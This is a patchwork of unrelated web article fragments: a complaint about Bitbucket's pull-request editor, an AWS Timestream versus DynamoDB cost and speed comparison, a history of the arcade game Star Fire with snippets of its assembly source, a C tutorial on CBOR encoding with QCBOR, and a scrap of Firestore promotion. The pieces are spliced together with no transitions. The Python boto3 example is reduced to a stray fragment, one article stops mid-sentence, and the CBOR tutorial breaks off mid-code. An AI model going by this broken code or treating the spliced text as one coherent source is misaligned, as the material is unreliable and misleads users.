<h3 id="smart-dumb-markdown-hybrid-support"><a href="#smart-dumb-markdown-hybrid-support" aria-label="smart dumb markdown hybrid support permalink"></a>Smart (dumb) markdown hybrid support</h3>
<p>The <a href="https://en.wikipedia.org/wiki/WYSIWYG">WYSIWYG</a> <a href="https://guides.github.com/features/mastering-markdown/">markdown</a> hybrid implementation produces stuff like this</p>
<p><img src="https://nosleepjavascript.com/e0371b316a1ee15020dc166396db9c4c/format.gif" alt="format"></p>
<h3 id="list-items-without-an-empty-line"><a href="#list-items-without-an-empty-line" aria-label="list items without an empty line permalink"></a>List items without an empty line</h3>
<p>This cannot happen in the comment textbox unless you force it to, but
it can happen in the PR description textbox and it can also happen when you
write the markdown in a <em>regular</em> text editor / IDE i.e. when committing code
via git, when writing the README, etc.</p>
<p>If you don’t leave an empty line before a list then it won’t get transformed correctly:</p>
<p><img src="https://nosleepjavascript.com/c8e58d30c452b643bf40ea77f00b21d0/lists.gif" alt="markdown lists"></p>
<h2 id="performance-of-the-text-box"><a href="#performance-of-the-text-box" aria-label="performance of the text box permalink"></a>Performance of the text box</h2>
<p>I have a pretty good and modern computer but most of the time
I experience heavy lags when writing a simple text only comment in <a href="https://bitbucket.org/">BB</a>.</p>
<p>I suspect this is related to the horrible <a href="https://en.wikipedia.org/wiki/WYSIWYG">WYSIWYG</a> implementation,
which we have just heavily broken down above.</p>
<h2 id="doesnt-work-on-large-prs"><a href="#doesnt-work-on-large-prs" aria-label="doesnt work on large prs permalink"></a>Doesn’t work on large PRs</h2>
<p>When a PR is a large (I know, I know, large PRs should not happen, but unfortunately sometimes they do)
BB will choose either</p>
<ol>
<li>consuming a lot of resources</li>
<li>not displaying the entire PR</li>

<p>In either case the UX ends up being bad.</p>
<p>In case <strong>1.</strong> you will get a lot of RAM being consumed and
most likely the scrolling and the interaction with the page
will be even more slow and awkward.</p>
<p>In case <strong>2.</strong> you need to click file by file to inspect a PR, which isn’t better IMO.</p>

<p>I’ve seen that the described behaviors tend to be cross
cutting problems across the <a href="https://www.atlassian.com/">Atlassian</a> suite, <a href="https://www.atlassian.com/software/jira">Jira</a> has similar
problems and <a href="https://confluence.atlassian.com/alldoc/atlassian-documentation-32243719.html">Confluence</a> is horrible, they are generally
really slow and clunky and unresponsive and text editing tends to be a pain.</p>

<p>PRs are one of the core use cases of <a href="https://bitbucket.org/">BB</a> as a product,
they are what have arguably made <a href="https://github.com/">Github</a> the beacon that it is now.</p>
<p>There are a few things your PR experience needs to provide at the base level</p>
<ul>
<li>PR title, description and inline comments.</li>
<li>Every text box needs to support plain markdown and maybe mentioning other people (tagging).</li>
<li>If you want to add markdown shortcuts make them <em>insert markdown</em> and <strong>not</strong> actually applying style.</li>
<li>Good diffing visualization (which BB does well IMO).</li>
<li>It is all about the code!</li>
<li>Copying code from the diff needs to work as expected.</li>
<li>Markdown code blocks (code snippets) are a fundamental feature of all your text boxes.</li>
<li>Either provide a really good experience inside your code blocks or do nothing.</li>
<li>Your app needs to be simple, small, fast and stable in time.</li>
<li>Some PRs are open for long periods of time, make sure your app is stable!.</li>
</ul>
<p>These are one the core features a good PR UI needs to provide, if anything,
these need to be the best of the best.</p>
<p>BB seems to have prioritized being “cute” or “pretty” (is it?) instead of being functional.</p>
<h2 id="solutions"><a href="#solutions" aria-label="solutions permalink"></a>Solutions</h2>
<p><a href="https://bitbucket.org/">Bitbucket</a> is a developer centric platform, use developer centric tools,
use plain old text inputs with good markdown support, add as little as possible
on top of that, make the experience of writing comments, PR descriptions,
code snippets as easy, simple and fast as possible.</p>
<p>Don’t leak stuff from <a href="https://www.atlassian.com/software/jira">Jira</a> and <a href="https://confluence.atlassian.com/alldoc/atlassian-documentation-32243719.html">Confluence</a> to <a href="https://bitbucket.org/">Bitbucket</a>, they have different
audience.</p>
<p>And if you have time… make sure <em>every</em> text input in your system has a plain text
mode, where either you interpret it as good old markdown or as unformatted text, either
is much better than what you have now.</p>

        <div>
  

  <p><span>29 Oct 2020</span></p><p>AWS recently announced that their <a href="https://aws.amazon.com/about-aws/whats-new/2020/09/amazon-timestream-now-generally-available/">Timestream database is now generally available</a>. I tried it out with an existing application that uses timeseries data. Based on my experimentation this article compares Amazon Timestream with DynamoDB and shows what I learned.</p>

<p><a href="https://blog.timescale.com/blog/what-the-heck-is-time-series-data-and-why-do-i-need-a-time-series-database-dcf3b1b18563/">Timeseries data is a sequence of data points stored in time order</a>. Each timestream record can be extended with dimensions that give more context on the measurement. One example are fuel measurements of trucks, with truck types and number plates as dimensions.</p>

<h2 id="prerequisites">Prerequisites</h2>

<p>As this article compares Timestream with DynamoDB, it’s good for you to have some experience with the latter. But even if you don’t, you can learn about both databases here.</p>

<p>I will also mention Lambda and API Gateway. If you’re not familiar with those two, just read them as “compute” and “api”.</p>

<h2 id="use-case">Use Case</h2>

<p>My application monitors markets to notify customers of trading opportunities and registers about 500,000 market changes each day. DynamoDB requires ~20 <a href="https://docs.aws.amazon.com/amazondynamodb/latest/developerguide/HowItWorks.ReadWriteCapacityMode.html">RCU/WCU</a>s for this. While most of the system is event-driven and can complete eventually, there are also userfacing dashboards that need fast responses.</p>

<p>Below you can see a picture of the current architecture, where a Lambda function pulls data into DynamoDB, another one creates notifications when a trading opportunity appears and an API Gateway that serves data for the user dashboards.</p>

<p><img src="https://github.com/bahrmichael/bahrmichael.github.io/raw/master/pictures/2020/timestream/timestream-use-case.png" alt="Architecture for Use Case"></p>

<p>Each record in the database consists of two measurements (price and volume), has two dimensions (article number and location) and has a timestamp.</p>

<p>Testing out Timestream required two changes: An additional Lambda function to replicate from DynamoDB to Timestream, and a new API that reads from Timestream.</p>

<h2 id="data-format">Data Format</h2>

<p>Let’s start by comparing the data format of DynamoDB and Timestream.</p>

<p><strong>DynamoDB</strong> holds a flexible amount of attributes, which are identified by a unique key. This means that you need to query for a key, and will get the according record with multiple attributes. That’s for example useful when you store meta information for movies or songs.</p>

<p><img src="https://github.com/bahrmichael/bahrmichael.github.io/raw/master/pictures/2020/timestream/data-format-dynamo.png" alt="Data Format DynamoDB"></p>

<p><strong>Timestream</strong> instead is designed to store continuous measurements, for example from a temperature sensor. There are only inserts, no updates. Each measurement has a name, value, timestamp and dimensions. A dimension can be for example the city where the temperature sensor is, so that we can group results by city.</p>

<p><img src="https://github.com/bahrmichael/bahrmichael.github.io/raw/master/pictures/2020/timestream/data-format-timestream.png" alt="Data Format Timestream"></p>

<h2 id="write-to-timestream">Write to Timestream</h2>

<p>Timestream shines when it comes to ingestion. The <a href="https://docs.aws.amazon.com/timestream/latest/developerguide/API_WriteRecords.html"><code>WriteRecords</code> API</a> is designed with a focus on batch inserts, which allows you to insert up to 100 records per request. With DynamoDB my batch inserts were sometimes throttled both with provisioned and ondemand capacity, while I saw no throttling with Timestream.</p>

<p>Below you can see a snapshot from AWS Cost Explorer when I started ingesting data with a <a href="https://aws.amazon.com/timestream/pricing">memory store</a> retention of 7 days. Memory store is Timestream’s fastest, but most expensive storage. It is required for ingestion but its retention can be reduced to one hour.</p>

<p><img src="https://github.com/bahrmichael/bahrmichael.github.io/raw/master/pictures/2020/timestream/timestream-write-storage-cost.png" alt="Timestream Write and Storage Cost"></p>

<p>The <strong>write operations are cheap</strong> and can be neglected in comparison to cost for storage and reading. Inserting 515,000 records has cost me $0.20, while the in-memory storage cost for all of those records totalled $0.37 after 7 days. My spending matches <a href="https://aws.amazon.com/timestream/pricing/">Timestream’s official pricing</a> of $0.50 per 1 million writes of 1KB size.</p>

<p>As <strong>each Timestream record can only contain one measurement</strong>, we need to split up the DynamoDB records which hold multiple measurements. Instead of writing one record with multiple attributes, we need to write one record per measure value.</p>

<p><strong>Backfilling old data</strong> might not be possible if its age exceeds the maximum retention time of the memory store which is 12 months. In October 2020 it was only possible to write to memory store and if you tried to insert older records you would get an error. To backfill and optimize cost you can start with 12 months retention and then lower it once your backfilling is complete.</p>

<h2 id="read-from-timestream">Read from Timestream</h2>

<p>You can read data from Timestream with SQL queries and get charged per GB of scanned data. <code>WHERE</code> clauses are key to limiting the amount of data that you scan because “data is pruned by Amazon Timestream’s query engine when evaluating query predicates” (<a href="https://aws.amazon.com/timestream/pricing/">Timestream Pricing</a>).</p>

<p><strong>The less data makes it through your <code>WHERE</code> clauses, the cheaper and faster your query.</strong></p>

<p>I tested the read speed by running the same queries against two APIs that were backed by DynamoDB (blue) and Timestream (orange) respectively. Below you can see a chart where I mimicked user behavior over the span of an hour. The spikes where DynamoDB got slower than Timestream were requests where computing the result required more than 500 queries to DynamoDB.</p>

<p><img src="https://github.com/bahrmichael/bahrmichael.github.io/raw/master/pictures/2020/timestream/access-speed-comparison.png" alt="Access Speed Comparison"></p>

<p>DynamoDB is designed for blazing fast queries, but <a href="https://bahr.dev/2020/02/02/aggregate-ddb/">doesn’t support adhoc analytics</a>. SQL queries won’t compete at getting individual records, but can get interesting once you have to access many different records and can’t precompute data. My queries to Timestream usually took more than a second, and I decided to <strong>precompute user facing data into DynamoDB</strong>.</p>

<p>Dashboards that update every minute or so and can wait 10s for a query to complete are fine with reading from Timestream. Use the right tool for the right job.</p>

<p>Timestream seems to have <strong>no limit on query length</strong>. An SQL query with 1,000 items in an SQL IN clause works fine, while <a href="https://docs.aws.amazon.com/amazondynamodb/latest/developerguide/Limits.html">DynamoDB limits queries to 100 operands</a>.</p>

<h2 id="timestream-pricing">Timestream Pricing</h2>

<p>Timestream pricing mostly comes down to two questions:</p>
<ul>
  <li>Do you need <strong>memory store with long retention</strong>?</li>
  <li>Do you <strong>read frequently</strong>?</li>
</ul>

<p>Below you can see the cost per storage type calculated into hourly, daily and monthly cost. On the right hand side you can see the relative cost compared to memory store.</p>



<p>My ingestion experiments with Timestream were quite cheap with 514,000 records inserted daily for a whole month and the cost ending up below $10. This is a low barrier to entry for you to make some experiments. I <strong>dropped the memory storage down to two hours</strong>, because I only needed it <strong>for ingestion</strong>. Magnetic store seemed fast enough for my queries.</p>

<p>When I tried to read and precompute data into DynamoDB every few seconds, I noticed that <strong>frequent reads can become expensive</strong>. Timestream requires you to pick an encryption key from the Key Management Service (KMS), which is then used to decrypt data when reading from Timestream. In my experiment decrypting with KMS accounted for about 30% of the actual cost.</p>

<p>Below you can see a chart of my spending on Timestream and KMS with frequent reads on October 14th and 15th.</p>

<p><img src="https://github.com/bahrmichael/bahrmichael.github.io/raw/master/pictures/2020/timestream/timestream-cost.png" alt="Timestream in Cost Explorer"></p>

<h2 id="problems-and-limitations">Problems and Limitations</h2>

<p><a href="https://docs.aws.amazon.com/timestream/latest/developerguide/API_RejectedRecord.html">Records can get rejected for three reasons</a>:</p>

<ul>
  <li>Duplicate values for the same dimensions, timestamps, and measure names</li>
  <li>Timestamps outside the memory’s retention store</li>
  <li>Dimensions or measures that exceed the Timestream limits (e.g. numbers that are bigger than a BigInt)</li>
</ul>

<p>Based on <a href="https://forums.aws.amazon.com/thread.jspa?messageID=960046&amp;#960046">my experience with these errors</a> I suggest that you <strong>log the errors but don’t let the exception bubble up</strong>. If you’re building historical charts, one or two missing values shouldn’t be a problem.</p>

<p>Below you can see an example of how I <a href="https://boto3.amazonaws.com/v1/documentation/api/latest/reference/services/timestream-write.html">write records to Timestream with the boto3 library for Python</a>.</p>

<div><div><pre><code><span>import</span> <span>boto3</span>

        <span>})</span>
</code></pre></div></div>

<p>Another perceived limitation is that each record can only hold one measurement (name and value). Assuming you have a vehicle with 200 sensors, you could write that into DynamoDB with one request, while Timestream already needs two. However this is pretty easy to compensate and I couldn’t come up with a good acceess pattern where you must combine different measurement types (e.g. temperature and voltage) in a single query.</p>

<p>Last but not least, Timestream does not have provisioned throughput yet. Especially when collecting data from a fleet of IoT sensors it would be nice to limit the ingestion to not cause cost spikes that may be caused by a bug in the sensors. In my tests the cost for writing records has been negligible though.</p>

<h2 id="summary">Summary</h2>

<p>I moved my timeseries data to Timestream, but added another DynamoDB table for precomputing user facing data. While my cost stayed roughly the same, I now have <strong>cheap long term storage at 12% of the previous price</strong>.</p>

<p>DynamoDB is faster for targeted queries, whereas <strong>Timestream is better for analytics</strong> that include large amounts of data. You can <strong>combine both and precompute</strong> data that needs fast access.</p>

<p>Trying out queries is key to understanding if it fits your use case and its requirements. You can do that in the timestream console with the AWS examples. Beware of frequent reads and monitor your spending.</p>

<h2 id="try-it-out">Try it out</h2>

<p>Try out one of the sample databases through the Timestream console or replicate some of the data you write to DynamoDB into Timestream. You can achieve the latter for example with <a href="https://docs.aws.amazon.com/amazondynamodb/latest/developerguide/Streams.html">DynamoDB streams</a>.</p>

		<p>Would you believe that chasing the high score was not always a part of arcade games? Indeed, until well after Pong it was not even a desired feature until 1978’s <em>Star Fire</em> took it to a whole new level. The tale of that game and its many innovations are what we will bring you today, as well as the source code which reveals even more secrets within the legendary game <em>Star Fire</em>.</p>

<p><em>Star Fire</em>, as with all good ideas, came from a place of ambition. The man with the plan was a fellow named Ted Michon. Michon had worked as a technician at arcade company Digital Games/Micronetics, which set him up to become a game creator for them when he created an early microprocessor game for them called <em>Night Racer</em>. With a new direction for games taking shape and the company he worked for falling apart, Michon decided to form his own independent arcade development company called Techni-Cal in 1976.</p>
<p>Ted was an alumnus of California Technical Institute (CalTech) and knew some of the computer-saavy students behind him in seniority. From this pool he settled on the inventive David Rolfe, who was a hotshot assembly programmer at the school. Rolfe readily admits that he has no interest in games as a matter of enjoyment, but leaps at the chance to solve hard problems. The task Michon had ready for his new employee would scratch that itch.</p>

<p>Ted had become enamored with an obscure film called <em>Star Wars</em>, particularly the iconic spaceship battles. He wanted to create a game which had that same sense of high-flying freedom, as well as incorporating a color monitor (for which had had found a cheap supplier). These sorts of tasks in the late 1970s, preceding even Space Invaders, were tall orders. Michon had created a hardware to facilitate this feat though, so it was up to Rolfe to make it sing.</p>
<p>Coupled with Ted’s then girlfriend (later wife) Susan Owen helping with art, the three person team would work out of Michon’s apartment via a terminal connected to the mainframe at CalTech to embark on their <em>Star Wars</em>-inspired project. At one point they even had hope they could secure the <em>Star Wars</em> license, though no official Star Wars game would emerge until 1982. They would retain major inspirations from that initial concept though, like the title screen at the enemy spacecraft. Michon secured a tentative deal with arcade manufacturer Midway Manufacturing, subsidiary of Bally, and the team would begin to show them work in progress.</p>
<figure id="attachment_10609" aria-describedby="caption-attachment-10609"><img loading="lazy" src="https://www.gamingalexandria.com/wp/wp-content/uploads/2020/08/02-Rolfe.jpg" alt="" width="260" height="285" srcset="https://www.gamingalexandria.com/wp/wp-content/uploads/2020/08/02-Rolfe.jpg 571w, https://www.gamingalexandria.com/wp/wp-content/uploads/2020/08/02-Rolfe-274x300.jpg 274w" sizes="(max-width: 260px) 100vw, 260px"><figcaption id="caption-attachment-10609">David Rolfe</figcaption></figure>
<p>Rolfe’s first problem to solve was creating an efficient color system which would not consume all the expensive RAM at their disposal. A standard, modern color system would assign a bit for every two colors on the screen, but even a four color system at even standard resolution would be over 32K of RAM. Rolfe’s solution would allow for up to eight total colors which only used 1.8 bits per pixel, with some compromises. For instance the stars in the background could change color from white to blue if one of the Tie Fighter-based enemy ships passed in front of it. Likely this was a form of color-cels as <a href="https://www.youtube.com/watch?v=Tfh0ytz8S0k">used on the Commodore 64</a>, spread across much larger objects.</p>
<p>Then to make the ships appear as if they existed in a 3D space, Rolfe would have to implement a new technique called spite-scaling. <a href="https://youtu.be/k0uFSSzYaJ8?t=174">Taito’s <em>Interceptor</em></a> had deployed this technique, but that game was only available in Japan. By having Susan create several different images of the enemy spacecraft, Rolfe could switch between the different sizes on the fly to have the fighters swoop in. All of this required a lot of storage, so much so that <em>Star Fire</em> wound up using 21 separate ROM chips to store all the game graphics and code.</p>
<p>Even with the unprecedented excitement and novelty the game could show, Midway was not impressed by the gameplay of <em>Star Fire</em>. It was suggested that they add in an extra element for the player to shoot, and perplexingly Midway President Hank Ross said that this should be a witch on a bicycle, not a spaceship. Even with this additional, the game still wasn’t deemed up to their standards, so Ted and David were both released from their deal.</p>
<p><iframe title="Mattel Electronics Intellivision programmer interviews" width="747" height="560" src="https://www.youtube.com/embed/UDZq4OLg7wQ?start=37&amp;feature=oembed" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p>
<p>With no money coming in, Rolfe had to find some extra work in the meantime. He joined up with APh Technology Consulting, who was at the time working on the programming backbone for what would become the Mattel Intellivision. Rolfe was directly responsible for providing a working prototype for the 1978 Winter CES, after which time Michon had managed to find a new buyer for their space flight game.</p>
<p>Exidy, a smaller arcade company out of Sunnyvale, California, was responsible for minor hits like <em>Death Race</em> and <em>Circus</em>. They were always seeking to push technological boundaries and thought <em>Star Fire</em> could be the sort of stand-out they needed. Rolfe returned to the project to make some minor changes – such as adding Exidy branding, including to an Enterprise-esque spaceship which replaced the witch – and the game was placed into a sit-down cabinet for increased immersion. It felt as close as they could get to the Star Wars game without a license.</p>
<p><img loading="lazy" src="https://www.gamingalexandria.com/wp/wp-content/uploads/2020/08/03-Star-Fire-Flyer-01.jpg" alt="" width="507" height="652" srcset="https://www.gamingalexandria.com/wp/wp-content/uploads/2020/08/03-Star-Fire-Flyer-01.jpg 1280w, https://www.gamingalexandria.com/wp/wp-content/uploads/2020/08/03-Star-Fire-Flyer-01-233x300.jpg 233w, https://www.gamingalexandria.com/wp/wp-content/uploads/2020/08/03-Star-Fire-Flyer-01-795x1024.jpg 795w, https://www.gamingalexandria.com/wp/wp-content/uploads/2020/08/03-Star-Fire-Flyer-01-768x989.jpg 768w, https://www.gamingalexandria.com/wp/wp-content/uploads/2020/08/03-Star-Fire-Flyer-01-1193x1536.jpg 1193w" sizes="(max-width: 507px) 100vw, 507px"></p>
<p>After release in November of 1978, Exidy did not find the mega-hit that they were looking for, but they did bring one significant innovation: The high score table. Rolfe had wanted to have players make a mark on the game as a signature of their accomplishments, and he felt that saving scores would be the best way to do that. Such a trick had never been done before. Some arcade owners might take down high scores by hand as part of a formal competition, but <em>Star Fire</em> put these competitive instincts into rigid code. Players would have a reason to return to a machine beyond the novelty, and that goalpost could change constantly, along with the ability to input their initials.</p>
<p>Following this, Rolfe would again work with Michon on the games Fire One and Kreepy Krawlers (unreleased) for Exidy before moving over to full-time on Intellivision work. Before that though, he had prepared a second version of Star Fire for export called ‘Star Fire II’ with fixes from its predecessor. Through the last 40 years, Rolfe has managed to maintain this source code for this game and has provided the opportunity for Gaming Alexandria to share its secrets!</p>
<p>The following observations were made by Ryou of <a href="http://sudden-desu.net/">Sudden Desu</a>, who delved into the Star Fire II code and extracted some interesting findings which support Rolfe’s tale.</p>
<hr>
<h2>STAR WARS</h2>
<p>The visual references are numerous and hard to ignore, from the STAR FIRE logo to the TIE fighter enemies, and even the Exidy ship which has the iconic X Wing laser guns. The David Rolfe interview elaborates on the reasoning behind this. The code is even more explicit in its references. SWARX.ASM is the code to draw the STAR FIRE logo on the title screen, and its TITLE directive is telling:</p>
<pre>TITLE "DO STAR WARS TITLE"</pre>
<p>When this code is called from ATRACT.ASM, it’s referred to as “SPACE WARS”</p>
<pre>CALL DOSWAR ;WRITE SPACE WARS SIGN</pre>
<p>The TIE fighter enemies are referred to by that name as well. TIE.ASM is their primary code.</p>
<pre>SEXTERN PS.TFIR,PS.PULS ;TIE FIGHTER FIRE IN INIT


;MUST BE CALLED BEFORE THE TIE FIGHTERS CYCLE THROUGH THE PSEUDO COLOR RAM
;THIS ROUTINE IS OPTIMIZED FOR SPEED BASE ON THE ASSUMPTION THAT
; MOST OF THE SCREEN IF FILLED WITH ZERO

</pre>
<h2>EASTER EGG</h2>
<p>Star Fire is known as being the first game which allowed for player initials to be saved alongside their score in the High Score list. This also means that Star Fire is the first game that has Easter Eggs based on player initials. The high score list code is located in ATRACT.ASM, and right at the top of the file we have this assembler expression:</p>
<pre>FT.GOD = -1 ;SET IF MACHINE KNOWS US</pre>
<p>And further down, among the code for the player initials input:</p>
<pre>IFE FT.GOD

<p>Indeed, if you enter DBR, TZM or SKM as your initials, you will then see a full screen message reading HI DAVE, HI TED or HI SUSAN, respectively.</p>
<p>You may notice that the labels for Susan’s block of code are TRYSKO and GOTSKO, which implies the initials for the easter egg changed from SKO to SKM. (Did Susan get married along the way…?) Indeed, SKM only works for Star Fire II. In the original Star Fire sets, the initials for Susan’s easter …</p></div></div>

In the embedded world, it’s not uncommon to serialize data so it can be efficently sent through the ether. On the other end it’s reassembled and used however necessary. In today’s post we’ll chat about serializing with <a href="https://cbor.io/" target="_blank">CBOR</a> (CBOR stands for Concise Binary Object Reprentation). It’s open, widely adopted and available in most popular programming languages.</p><p>The idea of CBOR is to take a structure or object, pack it up efficently for network usage. That way we transmit the least amount of data necessary. This will save you bandwidth but also cost especially for LTE deployments.</p><p>For the purpose of this post we’ll be creating a simple codec for use in embedded. On the “cloud” side we’ll use Rust’s <code>serde_cbor</code> to do the heavy lifting for us. We’ll start with the embedded side.</p><h2 id="your-embedded-options">Your embedded options</h2><p>For the purposes of this post, we’ll work on creating an example you can run on the machine you’re using. The only extra thing you’ll need for the process is to download and include a CBOR library in your project. I’m using <a href="https://github.com/laurencelundblade/QCBOR" target="_blank">QCBOR</a> for this example but other libraries are available like <a href="https://github.com/intel/tinycbor" target="_blank">TinyCBOR</a>. I’ve chosen QCBOR over the later because of its ease of use.</p><h2 id="creating-the-c-codec">Creating the C Codec</h2><p>First, lets create a codec that will encode and decode messages into CBOR format.</p><ol><li><p>First, let’s create the header file: <code>telemetry_codec.h</code></p><div><pre><code data-lang="c"><span>#include</span> <span>&lt;qcbor/qcbor.h&gt;</span><span>
</span><span></span>
<span>/* Position enum */</span>
<span>enum</span>
{
    telemetry_version_pos,
    telemetry_rssi_pos,
} telemetry_data_positions;

<span>/* Used to store strings */</span>
<span>typedef</span> <span>struct</span>
{
    <span>char</span> bytes[<span>64</span>];
    size_t size;
} telemetry_data_string_t;

<span>/* Struct for telemetry data */</span>
<span>typedef</span> <span>struct</span>
{
    telemetry_data_string_t version;
    int32_t rssi;

} telemetry_data_t;

<span>/* Encode function */</span>
QCBORError <span>telemetry_codec_encode</span>(<span>const</span> telemetry_data_t <span>*</span>p_data, uint8_t <span>*</span>p_buf, size_t len, size_t <span>*</span>p_size);
</code></pre></div><p>As you can see above, <code>telemetry_data_t</code> is the data that we’re trying to encode/decode. Within <code>telemetry_data_t</code> is a <code>telemetry_data_string_t</code> which you can use to store variable length buffer for strings.</p><p>You’ll also notice that i’m defining an enum called <code>telemetry_data_positions</code>. This definies the position in the CBOR that each piece of data will live. This is in substitution of string key/value setup like you’d often see in JSON. See below:</p><p>Instead of:</p><p>You get something like this:</p><p>As you can imagine, you’re saving some bytes here. Even more when you encode using CBOR rather than JSON!</p></li><li><p>Next we’ll want to define the encode function in <code>telemetry_codec.c</code>. First using the defintion provided in the <code>.h</code> file:</p><div><pre><code data-lang="c">QCBORError telemetry_codec_encode(<span>const</span> telemetry_data_t <span>*</span>p_data, uint8_t <span>*</span>p_buf, size_t len, size_t <span>*</span>p_size)
</code></pre></div><p>Within the function we want to set up a <code>UsefulBuf</code> which we’ll be encoding the data into. There’s also a <code>QCBOREncodeContext</code> that will contain the state of the encoder as it’s used:</p><div><pre><code data-lang="c">    <span>// Setup of the goods
</span><span></span>    UsefulBuf buf <span>=</span> {
        .ptr <span>=</span> p_buf,
        .len <span>=</span> len};
    QCBOREncodeContext ec;
    QCBOREncode_Init(<span>&amp;</span>ec, buf);
</code></pre></div><p>There are a handful ways to encode data. To emulate a JSON key/value store we’ll be putting our values into a map:</p><div><pre><code data-lang="c">    <span>/* Create over-arching map */</span>
    QCBOREncode_OpenMap(<span>&amp;</span>ec);
</code></pre></div><p>This allows us to use functions like <code>QCBOREncode_AddBytesToMapN</code> and <code>QCBOREncode_AddInt64ToMapN</code> to add data along with a position key:</p><div><pre><code data-lang="c">    <span>/* Add the version string */</span>
    UsefulBufC data <span>=</span> {
        .ptr <span>=</span> p_data<span>-&gt;</span>version.bytes,
        .len <span>=</span> p_data<span>-&gt;</span>version.size};
    QCBOREncode_AddBytesToMapN(<span>&amp;</span>ec, telemetry_version_pos, data);

    <span>/* Add the rssi */</span>
    QCBOREncode_AddInt64ToMapN(<span>&amp;</span>ec, telemetry_rssi_pos, p_data<span>-&gt;</span>rssi);
</code></pre></div><p>As you can see above, you can use another <code>UsefulBufC</code> for encoding the bytes from the <code>version</code>. You can encode values into a singluar entry by using <code>QCBOREncode_AddInt64ToMapN</code> or similar. This function will size the CBOR output appropirately an send the least amount of bytes necessary. Thus, in reality it will almost never send a fully 64 bit number.</p><p>Finally, make sure you close out the map and finish encoding!</p><div><pre><code data-lang="c">    <span>/* Close the map*/</span>
    QCBOREncode_CloseMap(<span>&amp;</span>ec);

    <span>/* Finish !*/</span>
    <span>return</span> <span>QCBOREncode_FinishGetSize</span>(<span>&amp;</span>ec, p_size);
</code></pre></div><p>In the end your <code>telemetry_codec.c</code> should look something like this:</p><div><pre><code data-lang="c"><span>#include</span> <span>&lt;telemetry_codec.h&gt;</span><span>
</span><span>#include</span> <span>&lt;stdio.h&gt;</span><span>
</span><span></span>
<span>/* Encode function */</span>
QCBORError <span>telemetry_codec_encode</span>(<span>const</span> telemetry_data_t <span>*</span>p_data, uint8_t <span>*</span>p_buf, size_t len, size_t <span>*</span>p_size)
{

    <span>// Setup of the goods
</span><span></span>    UsefulBuf buf <span>=</span> {
        .ptr <span>=</span> p_buf,
        .len <span>=</span> len};
    QCBOREncodeContext ec;
    QCBOREncode_Init(<span>&amp;</span>ec, buf);

    <span>/* Create over-arching map */</span>
    QCBOREncode_OpenMap(<span>&amp;</span>ec);

    <span>/* Add the version string */</span>
    UsefulBufC data <span>=</span> {
        .ptr <span>=</span> p_data<span>-&gt;</span>version.bytes,
        .len <span>=</span> p_data<span>-&gt;</span>version.size};
    QCBOREncode_AddBytesToMapN(<span>&amp;</span>ec, telemetry_version_pos, data);

    <span>/* Add the rssi */</span>
    QCBOREncode_AddInt64ToMapN(<span>&amp;</span>ec, telemetry_rssi_pos, p_data<span>-&gt;</span>rssi);

    <span>/* Close the map*/</span>
    QCBOREncode_CloseMap(<span>&amp;</span>ec);

    <span>/* Finish !*/</span>
    <span>return</span> QCBOREncode_FinishGetSize(<span>&amp;</span>ec, p_size);
}
</code></pre></div><p>That’s all what’s needed to encode a <code>telemetry_data_t</code> strucure! I’ve also created a decode function in the example code. You can get that at the bottom of this post.</p></li></ol><h2 id="creating-the-http-client">Creating the HTTP Client</h2><ol><li><p>Before getting started you’ll need some dependencies. On Mac you can install <code>cmake</code> and <code>curl</code> using <a href="https://brew.sh/" target="_blank">Homebrew</a>.</p><div><pre><code data-lang="bash">&gt; brew install cmake curl
</code></pre></div></li><li><p>You should also create a <code>CMakeLists.txt</code> with the following contents:</p><div><pre><code data-lang="fallback">cmake_minimum_required(VERSION 3.8.2)

# Project
project(CBORClientExample)

# Include directory
include_directories(include)
include_directories(lib/QCBOR/inc/)

file(GLOB QCBOR_FILES lib/QCBOR/src/*.c)

# Libcurl
link_libraries(curl)

# Executable
add_executable(client main.c src/telemetry_codec.c ${QCBOR_FILES})
</code></pre></div><p>This allows us to import dependencies and compile everything that’s needed. You’ll also notice that theres a <code>lib/QCBOR</code> reference. We’ll need to clone the QCBOR repo for that:</p><div><pre><code data-lang="bash">&gt; mkdir -p lib/
&gt; cd lib
&gt; git clone https://github.com/laurencelundblade/QCBOR.git
</code></pre></div><p>In the example code I added it as a submodule. No cloning necessary. (Initialize with <code>git submodule update --init</code>)</p></li><li><p>Finally in <code>main.c</code> you we can get to work encoding some data and then sending it via HTTP. First let’s create the data:</p><div><pre><code data-lang="c"><span>/* Create the object */</span>
telemetry_data_t data <span>=</span> {
    .rssi <span>=</span> <span>-</span><span>49</span>,
    .version <span>=</span> {
        .bytes <span>=</span> <span>"0.1.0"</span>,
        .size <span>=</span> strlen(<span>"0.1.0"</span>),
    }};
</code></pre></div><p>Then ecode using the <code>telemetry_codec_encode</code> function we just created:</p><div><pre><code data-lang="c"><span>/* Encode the data */</span>
uint8_t buf[<span>256</span>];
size_t size <span>=</span> <span>0</span>;
QCBORError err <span>=</span> telemetry_codec_encode(<span>&amp;</span>data, buf, <span>sizeof</span>(buf), <span>&amp;</span>size);

For free you get services that complement each other with ergonomic and easy to bootstrap libraries. With Firestore libs you get all the goodies of Firebase suite - auth, serverless, storage, ML and others perfectly blended with the language specifics.<br></p><p><img src="https://prismic-io.s3.amazonaws.com/leancodelanding2/dc9745e6-6cc3-45d1-bbb9-c661003ebaf7_Group+1529.png"></p><p>The only bad thing about it is that they are pervasive - once you get them, you start using them everywhere. In all layers. Generally, that is a bad thing, but letâ€™s be honest here, most small apps donâ€™t need any additional abstractions and using the libraries directly is a good thing.</p></div></div></div></section><section><div><div><div><div><p><img alt="" src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjY4IiBoZWlnaHQ9IjM4IiB2aWV3Qm94PSIwIDAgMjY4IDM4IiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxwYXRoIGQ9Ik0yNDguOTY5IDM4VjBNMjY4IDE4Ljk4NWgtMzguMDMyTTEzMy45ODUgMzhWMG0xOS4wMzEgMTguOTg1aC0zOC4wMzJNMTkuMDMxIDM4VjBtMTkuMDAxIDE4Ljk4NUgwIiBzdHJva2U9IiMwMDAiIHN0cm9rZS1taXRlcmxpbWl0PSIxMCIvPjwvc3ZnPg=="></p></div></div><div><h2><strong>Offline capabilities</strong></h2><p><img src="https://prismic-io.s3.amazonaws.com/leancodelanding2/62110205-82f5-4a52-bef3-2a190f906b77_Mask+Group+%285%29.png"></p><p>This is a major trait of Firestore. The truly killer feature - <strong>it can work </strong>(to some extent) <strong>offline.</strong> <em>Seamlessly</em>. If you have accessed the data 